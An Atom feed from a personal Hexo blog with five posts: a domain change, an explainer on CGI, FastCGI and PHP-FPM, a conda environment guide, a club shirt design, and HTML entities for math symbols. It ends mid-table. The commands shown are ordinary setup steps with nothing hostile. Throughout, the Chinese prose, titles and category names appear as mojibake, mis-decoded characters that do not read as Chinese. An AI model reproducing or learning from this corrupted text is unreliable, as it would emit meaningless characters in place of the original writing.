<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Cyris&#39;s pen</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://cyris.pen.moe/"/>
  <updated>2018-06-18T17:00:18.000Z</updated>
  <id>https://cyris.pen.moe/</id>
  
  <author>
    <name>Cyris</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>åŸŸåæ›´æ¢</title>
    <link href="https://cyris.pen.moe/posts/2018-6-16/"/>
    <id>https://cyris.pen.moe/posts/2018-6-16/</id>
    <published>2018-06-16T03:12:15.000Z</published>
    <updated>2018-06-18T17:00:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>æ¢åŸŸåå•¦ï¼blog.cyris.cn -&gt; cyris.pen.moe</p><a id="more"></a><p>äº¤äº†ä¸€å † deadlineï¼Œå¿ƒæƒ…èˆ’ç•…ï¼Œå¿™é‡Œå·é—²ä¸€ä¸‹ã€‚</p><p>å‰å‡ å¤©å¥–å­¦é‡‘ç»ˆäºåˆ°è´¦äº†ï¼Œäºæ˜¯æ–°è´­äº†ä¸ª <code>.moe</code> çš„åŸŸåï¼Œè™½ç„¶ä¹‹å‰ç”¨çš„ <code>.cn</code> æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä»·æ ¼ä¹Ÿè¿˜ç®—å‹å–„ï¼Œä½†è¿˜æ˜¯æ›´å–œæ¬¢ä¸ªæ€§ç‚¹çš„ä¸œè¥¿ï¼Œè‡³äº <code>.me</code>ï¼Œå®åœ¨æ˜¯å¤ªè´µäº†ã€‚å”¯ä¸€ä¸è¶³çš„æ˜¯è…¾è®¯çš„åŸŸåé‚®ç®±ä¸æ”¯æŒ <code>.moe</code> ï¼Œå…¶ä»–çš„ä¼ä¸šé‚®ç®±æ¥æ”¶èµ·æ¥ä¸å¤ªæ–¹ä¾¿ã€‚é™¤äº†ä¸€ç‚¹å¼ºè¿«ç—‡å¿ƒç†ï¼Œé—®é¢˜ä¸å¤§ã€‚æ¯”èµ·æŸäº‘çš„æ‚ä¹±è‡ƒè‚¿ï¼Œè¿˜æ˜¯æ›´å–œæ¬¢ä¸»æœºå£³é‚£ç§ç±»å‹çš„ã€‚</p><p>å¬è§çŸ¥äº†å£°äº†ï¼Œå¤å¤©æœ‰æ¨¡æœ‰æ ·äº†èµ·æ¥ã€‚æŒºå–œæ¬¢è¿™ä¸ªå­£èŠ‚çš„ï¼Œèƒ½åšçš„è®©äººæ„‰æ‚¦çš„äº‹æœ‰å¾ˆå¤š :D ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æ¢åŸŸåå•¦ï¼blog.cyris.cn -&amp;gt; cyris.pen.moe&lt;/p&gt;
    
    </summary>
    
      <category term="ç…®å­—" scheme="https://cyris.pen.moe/categories/%E7%85%AE%E5%AD%97/"/>
    
    
      <category term="ç…®å­—" scheme="https://cyris.pen.moe/tags/%E7%85%AE%E5%AD%97/"/>
    
  </entry>
  
  <entry>
    <title>æµ…è°ˆ PHP-FPM</title>
    <link href="https://cyris.pen.moe/posts/php-fpm/"/>
    <id>https://cyris.pen.moe/posts/php-fpm/</id>
    <published>2018-05-06T11:20:00.000Z</published>
    <updated>2018-05-13T11:53:07.000Z</updated>
    
    <content type="html"><![CDATA[<p>å…³äº FPM ï¼ŒFastCGI ï¼ŒCGI ä¹‹é—´çš„å…³ç³»ä¸åŒºåˆ«ã€‚</p><a id="more"></a><h2 id="ä¸€ã€æ¦‚è¿°"><a href="#ä¸€ã€æ¦‚è¿°" class="headerlink" title="ä¸€ã€æ¦‚è¿°"></a>ä¸€ã€æ¦‚è¿°</h2><p>ä»€ä¹ˆæ˜¯ FPM ï¼Ÿ</p><p>FPM çš„å…¨ç§°æ˜¯ <code>FastCGI Process Manager</code> ï¼Œå³ PHP FastCGI è¿è¡Œæ¨¡å¼çš„ä¸€ä¸ªè¿›ç¨‹ç®¡ç†å™¨ï¼Œä»å®šä¹‰å°±å¯ä»¥çœ‹å‡ºå®ƒçš„æ ¸å¿ƒåŠŸèƒ½æ˜¯<strong>è¿›ç¨‹ç®¡ç†</strong>ï¼Œé‚£å®ƒç”¨æ¥ç®¡ç†ä»€ä¹ˆè¿›ç¨‹å‘¢ï¼Œè¿™ä¸ª FastCGI åˆæ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Œå’Œ CGI åˆæœ‰ä»€ä¹ˆæ ·çš„å…³ç³»å‘¢ï¼Ÿ</p><h2 id="äºŒã€ä»-CGI-è¯´èµ·"><a href="#äºŒã€ä»-CGI-è¯´èµ·" class="headerlink" title="äºŒã€ä» CGI è¯´èµ·"></a>äºŒã€ä» CGI è¯´èµ·</h2><p>å…ˆæ¥çœ‹ä¸€æ®µç»´åŸºç™¾ç§‘ä¸Šçš„æè¿°ï¼š</p><blockquote><p>é€šç”¨ç½‘å…³æ¥å£ï¼ˆCommon Gateway Interface/CGIï¼‰æ˜¯ä¸€ç§é‡è¦çš„äº’è”ç½‘æŠ€æœ¯ï¼Œå¯ä»¥è®©ä¸€ä¸ªå®¢æˆ·ç«¯ï¼Œä»ç½‘é¡µæµè§ˆå™¨å‘æ‰§è¡Œåœ¨ç½‘ç»œæœåŠ¡å™¨ä¸Šçš„ç¨‹åºè¯·æ±‚æ•°æ®ã€‚CGIæè¿°äº†æœåŠ¡å™¨å’Œè¯·æ±‚å¤„ç†ç¨‹åºä¹‹é—´ä¼ è¾“æ•°æ®çš„ä¸€ç§æ ‡å‡†ã€‚</p></blockquote><p><br></p><p>CGI æ˜¯ä¸€ç§<strong>åè®®</strong>ï¼Œç”¨æ¥ä¿è¯ Web server ä¼ é€’è¿‡æ¥çš„æ•°æ®æ˜¯æ ‡å‡†æ ¼å¼ï¼Œä»¥æ–¹ä¾¿ CGI ç¨‹åºçš„è¿è¡Œã€‚è€Œ Web serverï¼ˆä¾‹å¦‚ Nginxï¼‰æ‰¿æ‹…çš„å·¥ä½œåˆ™æ˜¯å†…å®¹çš„åˆ†å‘ï¼Œæ¯”å¦‚ä½ è¦è¯·æ±‚ <code>/index.html</code>ï¼ŒWeb server å°±ä¼šå»æ–‡ä»¶ç³»ç»Ÿä¸­å¯»æ‰¾è¿™ä¸ªæ–‡ä»¶ï¼Œç„¶åå‘é€ç»™æµè§ˆå™¨ï¼Œæ­¤æ—¶å®ƒåˆ†å‘çš„æ˜¯é™æ€èµ„æºã€‚</p><p>PHP æ˜¯ä¸€ä¸ªè„šæœ¬è§£æå™¨ï¼Œåœ¨ç½‘ç»œåº”ç”¨åœºæ™¯ä¸‹å¹¶æ²¡æœ‰å®ç° HTTP ç½‘ç»œåº“ï¼Œè€Œæ˜¯å®ç°äº†å¯¹ CGIï¼FastCGI è¿™æ ·çš„åè®®çš„è§£æï¼Œç„¶åä¸ Web æœåŠ¡å™¨é…åˆå®ç°äº† HTTP çš„å¤„ç†ã€‚</p><p>æ¯”å¦‚æˆ‘ä»¬è¯·æ±‚ä¸€ä¸ª <code>/index.php</code> ï¼Œæ ¹æ®é…ç½®ï¼ŒWeb server åˆ¤æ–­è¿™æ˜¯ä¸ªåŠ¨æ€èµ„æºï¼Œç„¶åå¯»æ‰¾ PHP è§£æå™¨è¿›è¡Œå¤„ç†ã€‚å½“æ”¶åˆ°ä¸€ä¸ªåŒ¹é… URL çš„è¯·æ±‚æ—¶ï¼Œç›¸åº”çš„ç¨‹åºå°±ä¼šè¢«è°ƒç”¨ï¼Œä¾‹å¦‚ PHP è§£æå™¨ä¼šè§£æ php.ini æ–‡ä»¶ç„¶ååˆå§‹åŒ–æ‰§è¡Œç¯å¢ƒï¼Œå¹¶å°†å®¢æˆ·ç«¯å‘é€çš„æ•°æ®ï¼ˆURLã€æŸ¥è¯¢çš„æ•°æ®ã€HTTP header ç­‰ï¼‰ä½œä¸ºè¾“å…¥ï¼Œç»è¿‡å¤„ç†ä¹‹åï¼ˆæ¯”å¦‚å®šä¹‰çš„ä¸€äº›å‡½æ•°åŠŸèƒ½ï¼‰ï¼Œç¨‹åºçš„è¾“å‡ºä¼šè¢« Web æœåŠ¡å™¨æ”¶é›†ï¼Œå¹¶åŠ ä¸Šåˆé€‚çš„æ¡£å¤´è¿”å›ç»™å®¢æˆ·ç«¯ã€‚</p><h2 id="ä¸‰ã€FastCGI-çš„è¯ç”Ÿ"><a href="#ä¸‰ã€FastCGI-çš„è¯ç”Ÿ" class="headerlink" title="ä¸‰ã€FastCGI çš„è¯ç”Ÿ"></a>ä¸‰ã€FastCGI çš„è¯ç”Ÿ</h2><p>ç°åœ¨æˆ‘ä»¬çŸ¥é“ CGI åªæ˜¯ä¸€ç§åè®®ï¼Œè€Œ FastCGI åˆ™æ˜¯ä¸€ç§ä¼˜åŒ–äº† CGI çš„<strong>åè®®</strong>ã€‚ä¼˜åŒ–çš„åœ°æ–¹ï¼Œå°±åœ¨åˆšåˆšæåˆ°çš„ <code>PHP è§£æå™¨è§£æ php.ini æ–‡ä»¶å¹¶åˆå§‹åŒ–æ‰§è¡Œç¯å¢ƒ</code> è¿™éƒ¨åˆ†ã€‚æ ‡å‡†çš„ CGI ç¨‹åºå¯¹æ¯ä¸ªè¯·æ±‚éƒ½ä¼šæ‰§è¡Œè¿™äº›æ“ä½œï¼Œå¦‚æœç”¨æˆ·è¿˜è¦å†æ¬¡è¯·æ±‚åŠ¨æ€èµ„æºï¼ŒWeb æœåŠ¡å™¨å°†é‡æ–° fork ä¸€ä¸ªæ–°çš„è¿›ç¨‹ï¼Œè¿™æ˜¾ç„¶æ˜¯ä¸€ç§å¾ˆä½æ•ˆçš„åšæ³•ï¼Œå°¤å…¶æ˜¯åœ¨é«˜è´Ÿè½½ä¸‹ï¼Œæ“ä½œç³»ç»Ÿåˆ›å»ºå’Œé”€æ¯è¿›ç¨‹çš„å¼€é”€å°†ååˆ†å·¨å¤§ã€‚</p><p>FastCGI ä¸æ˜¯ä¸ºæ¯ä¸€ä¸ªè¯·æ±‚åˆ›å»ºè¿›ç¨‹ï¼Œè€Œæ˜¯é€šè¿‡ master-worker è¿™æ ·çš„æ¨¡å‹ï¼Œä½¿ç”¨æŒä¹…åŒ–è¿›ç¨‹æ¥å¤„ç†è¯·æ±‚ã€‚å³åœ¨æœåŠ¡å™¨å¯åŠ¨æ—¶ä¾¿åˆ›å»º master ä¸ ä¸€å®šæ•°é‡çš„ workerï¼Œåœ¨è¯·æ±‚åˆ°æ¥æ—¶ master å¯ä»¥æŒç»­åˆ†é… worker å»å¤„ç†è¯·æ±‚ã€‚FastCGI ä¼šç»´æŠ¤ä¸€ä¸ªè¿›ç¨‹æ± ï¼Œæ ¹æ®èµ„æºä¸è¯·æ±‚çŠ¶å†µè°ƒæ•´ worker æ•°é‡ä»¥èŠ‚çœèµ„æºï¼Œæé«˜æ€§èƒ½ã€‚</p><p><img src="/posts/php-fpm/fastcgi.png" alt=""></p><h2 id="å››ã€FPM-çš„å®ç°"><a href="#å››ã€FPM-çš„å®ç°" class="headerlink" title="å››ã€FPM çš„å®ç°"></a>å››ã€FPM çš„å®ç°</h2><p>ä» PHP54 å¼€å§‹ï¼ŒPHP å®˜æ–¹åŠ å…¥äº† FPM æ¥ç®¡ç† FastCGI çš„è¿›ç¨‹ã€‚æ³¨æ„ï¼Œåœ¨è¿™ä¹‹å PHP-FPM ä¸ PHP-CGI æ²¡æœ‰ä»»ä½•å…³ç³»ã€‚PHP-FPM æ˜¯å¯¹ FastCGI çš„å…·ä½“å®ç°ï¼Œè€Œ PHP-CGI åªæ˜¯ä¸ª CGI ç¨‹åºï¼Œå¹¶ä¸ä¼šç®¡ç†è¿›ç¨‹ã€‚</p><p>ç®€å•æ¥è¯´ï¼ŒFPM çš„å®ç°å°±æ˜¯åˆ›å»ºä¸€ä¸ª master è¿›ç¨‹ï¼Œåœ¨ master è¿›ç¨‹ä¸­åˆ›å»ºå¹¶ç›‘å¬ socketï¼Œç„¶å fork å‡ºå¤šä¸ªå­è¿›ç¨‹ï¼Œè¿™äº›å­è¿›ç¨‹å„è‡ªæ¥å—è¯·æ±‚ã€‚å­è¿›ç¨‹çš„å¤„ç†éå¸¸ç®€å•ï¼Œå®ƒåœ¨å¯åŠ¨åé˜»å¡åœ¨ accept ä¸Šï¼Œæœ‰è¯·æ±‚åˆ°è¾¾åå¼€å§‹è¯»å–è¯·æ±‚æ•°æ®ï¼Œè¯»å–å®Œæˆåå¼€å§‹å¤„ç†ç„¶åå†è¿”å›ï¼Œåœ¨è¿™æœŸé—´æ˜¯ä¸ä¼šæ¥æ”¶å…¶å®ƒè¯·æ±‚çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ FPM çš„å­è¿›ç¨‹åŒæ—¶åªèƒ½å“åº”ä¸€ä¸ªè¯·æ±‚ï¼Œåªæœ‰æŠŠè¿™ä¸ªè¯·æ±‚å¤„ç†å®Œæˆåæ‰ä¼š accept ä¸‹ä¸€ä¸ªè¯·æ±‚ã€‚</p><p>FPM çš„ master è¿›ç¨‹ä¸ worker è¿›ç¨‹ä¹‹é—´ä¸ä¼šç›´æ¥è¿›è¡Œé€šä¿¡ï¼Œmaster é€šè¿‡å…±äº«å†…å­˜è·å– worker è¿›ç¨‹çš„ä¿¡æ¯ï¼Œæ¯”å¦‚ worker è¿›ç¨‹å½“å‰çŠ¶æ€ã€å·²å¤„ç†è¯·æ±‚æ•°ç­‰ï¼Œå½“ master è¿›ç¨‹è¦ kill ä¸€ä¸ª worker è¿›ç¨‹æ—¶åˆ™é€šè¿‡å‘é€ä¿¡å·çš„æ–¹å¼é€šçŸ¥ worker è¿›ç¨‹ã€‚</p><p>FPM å¯ä»¥åŒæ—¶ç›‘å¬å¤šä¸ªç«¯å£ï¼Œæ¯ä¸ªç«¯å£å¯¹åº”ä¸€ä¸ª worker poolï¼Œè€Œæ¯ä¸ª pool ä¸‹å¯¹åº”å¤šä¸ª worker è¿›ç¨‹ï¼Œç±»ä¼¼ Nginx ä¸­ Server çš„æ¦‚å¿µã€‚</p><p>æˆ‘ä»¬åœ¨é…åˆ Nginx çš„ä½¿ç”¨çš„æ—¶å€™ï¼Œå¸¸å¸¸ä¼šé‡åˆ° 502 çš„é”™è¯¯ï¼Œè¿™æ˜¯å› ä¸ºæ²¡æœ‰å¯ç”¨çš„è¿›ç¨‹äº†ï¼Œå°±è¿”å›äº†é”™è¯¯ã€‚å¦‚æœæ˜¯ worker è¿›ç¨‹å¤„ç†è¯·æ±‚è¶…æ—¶ï¼Œåˆ™è¿”å› 504 é”™è¯¯ã€‚</p><p>å…³äº FPM çš„è¯¦ç»†å®ç°å¯ä»¥å‚è€ƒ <a href="https://github.com/pangudashu/php7-internal/blob/master/1/fpm.md" target="_blank" rel="noopener">PHP7 å†…æ ¸å‰–æ - fpm</a> è¿™ç¯‡æ–‡ç« ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å…³äº FPM ï¼ŒFastCGI ï¼ŒCGI ä¹‹é—´çš„å…³ç³»ä¸åŒºåˆ«ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="PHP" scheme="https://cyris.pen.moe/categories/PHP/"/>
    
    
      <category term="PHP" scheme="https://cyris.pen.moe/tags/PHP/"/>
    
      <category term="FPM" scheme="https://cyris.pen.moe/tags/FPM/"/>
    
  </entry>
  
  <entry>
    <title>Anaconda åˆä½“éªŒ</title>
    <link href="https://cyris.pen.moe/posts/python-with-anaconda/"/>
    <id>https://cyris.pen.moe/posts/python-with-anaconda/</id>
    <published>2018-04-29T05:47:25.000Z</published>
    <updated>2018-05-08T23:50:19.000Z</updated>
    
    <content type="html"><![CDATA[<p>Anaconda æ˜¯ä¸€ä¸ª Python çš„å‘è¡Œç‰ˆï¼ŒåŒ…å«äº†ä¸°å¯Œçš„ç§‘å­¦è®¡ç®—åŒ…ï¼Œå¹¶æœ‰ Conda è¿™ä¸€å·¥å…·è¿›è¡ŒåŒ…ä¸ç¯å¢ƒçš„ç®¡ç†ã€‚</p><a id="more"></a><p>å®ƒçš„ä½“ç§¯ç¡®å®æœ‰ç‚¹å¤§ï¼Œå°å®¹é‡é€‰æ‰‹å¯ä»¥è€ƒè™‘ <a href="https://conda.io/miniconda.html" target="_blank" rel="noopener">Miniconda</a>ã€‚</p><h2 id="ä¸€ã€-å®‰è£…-Anaconda"><a href="#ä¸€ã€-å®‰è£…-Anaconda" class="headerlink" title="ä¸€ã€ å®‰è£… Anaconda"></a>ä¸€ã€ å®‰è£… Anaconda</h2><p>ä¸‹è½½åœ°å€ï¼š<a href="https://www.anaconda.com/download/" target="_blank" rel="noopener">https://www.anaconda.com/download/</a></p><p>ä»¥ macOS ä¸ºä¾‹ï¼Œç¨‹åºå®‰è£…æ—¶å®ƒä¼šåœ¨ <code>~/.bash_profile</code> å†™å…¥ Pathï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># added by Anaconda3 5.1.0 installer</span></span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">PATH</span>=<span class="string">"/Users/cyris/anaconda3/bin:<span class="variable">$PATH</span>"</span></span><br></pre></td></tr></table></figure><p>å¦‚æœç”¨çš„æ˜¯ zsh ï¼Œå°±åœ¨ <code>.zshrc</code> ä¸­æ‰‹åŠ¨æ·»åŠ è¿™æ¡å‘½ä»¤ã€‚</p><p>è®©é…ç½®ç”Ÿæ•ˆï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">source</span> .zshrc</span></span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹é…ç½®æ˜¯å¦ç”Ÿæ•ˆï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> conda --version</span></span><br></pre></td></tr></table></figure><h2 id="äºŒã€-ä½¿ç”¨-Conda-è¿›è¡Œç¯å¢ƒç®¡ç†"><a href="#äºŒã€-ä½¿ç”¨-Conda-è¿›è¡Œç¯å¢ƒç®¡ç†" class="headerlink" title="äºŒã€ ä½¿ç”¨ Conda è¿›è¡Œç¯å¢ƒç®¡ç†"></a>äºŒã€ ä½¿ç”¨ Conda è¿›è¡Œç¯å¢ƒç®¡ç†</h2><p>Update Conda: </p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ conda update -<span class="built_in">n</span> <span class="built_in">base</span> conda</span><br></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªåä¸º <code>venv</code> çš„ç¯å¢ƒï¼ŒPython ç‰ˆæœ¬æŒ‡å®šä¸º 2.7ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ conda create -n venv <span class="attribute">python</span>=2.7</span><br></pre></td></tr></table></figure><p>æ¿€æ´»ç¯å¢ƒï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">source</span> activate venv</span></span><br></pre></td></tr></table></figure><p>é€€å‡ºå½“å‰ç¯å¢ƒï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">source</span> deactivate</span></span><br></pre></td></tr></table></figure><p>åˆ é™¤ç¯å¢ƒï¼š</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span> conda remove -n venv --<span class="keyword">all</span></span><br></pre></td></tr></table></figure><p>å¤åˆ¶ä¸€ä¸ªç¯å¢ƒï¼ˆå·²æœ‰ä¸€ä¸ªåä¸º venv çš„ç¯å¢ƒï¼‰ï¼š</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ conda create -n venv-<span class="number">2</span> --<span class="keyword">clone</span> <span class="title">venv</span></span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æ‰€æœ‰ç¯å¢ƒï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> conda info <span class="_">-e</span></span></span><br></pre></td></tr></table></figure><p><br></p><p>å¯ä»¥ç®€åŒ–ä¸€ä¸‹å‘½ä»¤ï¼Œåœ¨ <code>.zshrc</code> ä¸­æ·»åŠ ä¸€ä¸ªåˆ«åï¼š<code>alias workon=&#39;source activate&#39;</code>ï¼Œå°±å¯ä»¥ç”¨ <code>$ workon env-name</code> çš„æ–¹å¼æ¿€æ´»ç¯å¢ƒäº†ã€‚</p><p>æ‰€æœ‰ç¯å¢ƒéƒ½ä¼šè¢«å®‰è£…åœ¨ <code>/anaconda3/envs/</code> ç›®å½•ä¸‹ã€‚</p><h2 id="ä¸‰ã€-Package-ç®¡ç†"><a href="#ä¸‰ã€-Package-ç®¡ç†" class="headerlink" title="ä¸‰ã€ Package ç®¡ç†"></a>ä¸‰ã€ Package ç®¡ç†</h2><p>ç»™æŸä¸ªç‰¹å®šç¯å¢ƒå®‰è£… Package æœ‰ä¸¤ç§æ–¹å¼ï¼š</p><ol><li>ç›´æ¥åˆ‡æ¢åˆ°é‚£ä¸ªç¯å¢ƒä¸­ç„¶åä½¿ç”¨ <code>conda install package-name</code> å‘½ä»¤è¿›è¡Œå®‰è£…</li><li>åœ¨æ‰§è¡Œå®‰è£…å‘½ä»¤æ—¶æ·»åŠ  <code>-n</code> å‚æ•°æ¥æŒ‡å®šç¯å¢ƒï¼š<code>conda install -n env-name package-name</code></li></ol><p>æŸ¥çœ‹å·²ç»å®‰è£…çš„ Packageï¼š<code>conda list</code> ï¼ˆè¦æŸ¥çœ‹æŒ‡å®šç¯å¢ƒä¸­å®‰è£…çš„åŒ…ï¼ŒåŒæ ·åœ¨åé¢åŠ ä¸Š <code>-n</code> å‚æ•°å°±å¥½äº†ã€‚ï¼‰</p><p>æŸ¥æ‰¾åŒ…ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> conda search package-name</span></span><br></pre></td></tr></table></figure><p>æ›´æ–°åŒ…ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ conda <span class="keyword">update</span> <span class="keyword">package</span>-<span class="keyword">name</span></span><br></pre></td></tr></table></figure><p>ä¸€äº› conda æ²¡æœ‰çš„åŒ…ï¼Œå¯ä»¥ä½¿ç”¨ pip å®‰è£…ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Anaconda æ˜¯ä¸€ä¸ª Python çš„å‘è¡Œç‰ˆï¼ŒåŒ…å«äº†ä¸°å¯Œçš„ç§‘å­¦è®¡ç®—åŒ…ï¼Œå¹¶æœ‰ Conda è¿™ä¸€å·¥å…·è¿›è¡ŒåŒ…ä¸ç¯å¢ƒçš„ç®¡ç†ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="https://cyris.pen.moe/categories/Python/"/>
    
    
      <category term="Python" scheme="https://cyris.pen.moe/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Vidar-Team å¤å­£ä¼šæœè®¾è®¡</title>
    <link href="https://cyris.pen.moe/posts/vidar-logo/"/>
    <id>https://cyris.pen.moe/posts/vidar-logo/</id>
    <published>2018-04-23T14:25:59.000Z</published>
    <updated>2018-06-12T16:07:15.000Z</updated>
    
    <content type="html"><![CDATA[<p>å’•äº†å¾ˆä¹…çš„ä¼šæœä¸Šçº¿å•¦ï¼ŒåŠ å…¥äº†ç‚¹åå‘¨å¹´çºªå¿µçš„å…ƒç´  XDã€‚</p><p>é¡ºä¾¿æ•´ç†äº†ä¸‹ç¾å·¥ææ–™ï¼š<a href="https://github.com/iCyris/Vidar-Logo" target="_blank" rel="noopener">Vidar-Logo</a><br><a id="more"></a></p><p><img src="/posts/vidar-logo/vidar-å¤-1.png" alt=""></p><p><img src="/posts/vidar-logo/vidar-å¤-4.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å’•äº†å¾ˆä¹…çš„ä¼šæœä¸Šçº¿å•¦ï¼ŒåŠ å…¥äº†ç‚¹åå‘¨å¹´çºªå¿µçš„å…ƒç´  XDã€‚&lt;/p&gt;
&lt;p&gt;é¡ºä¾¿æ•´ç†äº†ä¸‹ç¾å·¥ææ–™ï¼š&lt;a href=&quot;https://github.com/iCyris/Vidar-Logo&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Vidar-Logo&lt;/a&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="ç…®å­—" scheme="https://cyris.pen.moe/categories/%E7%85%AE%E5%AD%97/"/>
    
    
      <category term="ç…®å­—" scheme="https://cyris.pen.moe/tags/%E7%85%AE%E5%AD%97/"/>
    
  </entry>
  
  <entry>
    <title>åˆ©ç”¨ HTML åœ¨ Markdown ä¸­æ‰“å‡ºæ•°å­¦ç¬¦å·</title>
    <link href="https://cyris.pen.moe/posts/markdown-tip/"/>
    <id>https://cyris.pen.moe/posts/markdown-tip/</id>
    <published>2018-03-28T04:03:56.000Z</published>
    <updated>2018-05-06T02:46:23.000Z</updated>
    
    <content type="html"><![CDATA[<p>æƒ³è¦æ‰“å‡ºå¥‡å¥‡æ€ªæ€ªçš„ç¬¦å· :D</p><a id="more"></a><h2 id="1-ä¸Šæ ‡"><a href="#1-ä¸Šæ ‡" class="headerlink" title="1. ä¸Šæ ‡"></a>1. ä¸Šæ ‡</h2><p>n<sup>2</sup>=n+1</p><p><code>n&lt;sup&gt;2&lt;/sup&gt;=n+1</code></p><h2 id="2-ä¸‹æ ‡"><a href="#2-ä¸‹æ ‡" class="headerlink" title="2. ä¸‹æ ‡"></a>2. ä¸‹æ ‡</h2><p>a=log<sub>2</sub>b</p><p><code>a=log&lt;sub&gt;2&lt;/sub&gt;b</code></p><h2 id="3-æ³¨å†Œå•†æ ‡"><a href="#3-æ³¨å†Œå•†æ ‡" class="headerlink" title="3. æ³¨å†Œå•†æ ‡"></a>3. æ³¨å†Œå•†æ ‡</h2><p>hexo &reg;</p><p><code>hexo &amp;reg;</code></p><h2 id="4-function-ç¬¦å·"><a href="#4-function-ç¬¦å·" class="headerlink" title="4. function ç¬¦å·"></a>4. function ç¬¦å·</h2><p>&fnof;(x)=x+1</p><p><code>&amp;fnof;(x)=x+1</code></p><h2 id="5-æ ¹å·"><a href="#5-æ ¹å·" class="headerlink" title="5. æ ¹å·"></a>5. æ ¹å·</h2><p>&radic;2 ï¼ˆæ„Ÿè§‰ä¸æ˜¯å¾ˆå¥½çœ‹ï¼‰</p><p><code>&amp;radic;2</code></p><h2 id="6-è§’åº¦ç¬¦å·"><a href="#6-è§’åº¦ç¬¦å·" class="headerlink" title="6. è§’åº¦ç¬¦å·"></a>6. è§’åº¦ç¬¦å·</h2><p>30&deg;</p><p><code>30&amp;deg;</code></p><h2 id="7-ä¸€ç‚¹å°å·¥ä½œ"><a href="#7-ä¸€ç‚¹å°å·¥ä½œ" class="headerlink" title="7. ä¸€ç‚¹å°å·¥ä½œ"></a>7. ä¸€ç‚¹å°å·¥ä½œ</h2><p>æ•´ç†äº†ä¸€äº›æ¯”è¾ƒå¸¸ç”¨çš„ç‰¹æ®Šç¬¦å·çš„ HTML ç¼–ç ï¼š</p><table><thead><tr><th style="text-align:left">ç¬¦å·</th><th style="text-align:left">è¯´æ˜</th><th style="text-align:left">ç¼–ç </th></tr></thead><tbody><tr><td style="text-align:left">&times;</td><td style="text-align:left">ä¹˜å·</td><td style="text-align:left"><code>&amp;times;</code></td></tr><tr><td style="text-align:left">&divide;</td><td style="text-align:left">é™¤å·</td><td style="text-align:left"><code>&amp;divide;</code></td></tr><tr><td style="text-align:left">&larr;</td><td style="text-align:left">å‘å·¦ç®­å¤´</td><td style="text-align:left"><code>&amp;larr;</code></td></tr><tr><td style="text-align:left">&rarr;</td><td style="text-align:left">å‘å³ç®­å¤´</td><td style="text-align:left"><code>&amp;rarr;</code></td></tr><tr><td style="text-align:left">&uarr;</td><td style="text-align:left">å‘ä¸Šç®­å¤´</td><td style="text-align:left"><code>&amp;uarr;</code></td></tr><tr><td style="text-align:left">&darr;</td><td style="text-align:left">å‘ä¸‹ç®­å¤´</td><td style="text-align:left"><code>&amp;darr;</code></td></tr><tr><td style="text-align:left">&harr;</td><td style="text-align:left">åŒå‘ç®­å¤´</td><td style="text-align:left"><code>&amp;harr;</code></td></tr><tr><td style="text-align:left">&lArr;</td><td style="text-align:left">åŒçº¿å‘å·¦ç®­å¤´</td><td style="text-align:left"><code>&amp;lArr;</code></td></tr><tr><td style="text-align:left">&rArr;</td><td style="text-align:left">åŒçº¿å‘å³ç®­å¤´</td><td style="text-align:left"><code>&amp;rArr;</code></td></tr><tr><td style="text-align:left">&hArr;</td><td style="text-align:left">åŒçº¿åŒå‘ç®­å¤´</td><td style="text-align:left"><code>&amp;hArr;</code></td></tr><tr><td style="text-align:left">&nbsp;</td><td style="text-align:left">ç©ºæ ¼</td><td style="text-align:left"><code>&amp;nbsp;</code></td></tr><tr><td style="text-align:left">&plusmn;</td><td style="text-align:left">æ­£è´Ÿç¬¦å·</td><td style="text-align:left"><code>&amp;plusmn;</code></td></tr><tr><td style="text-align:left">&infin;</td><td 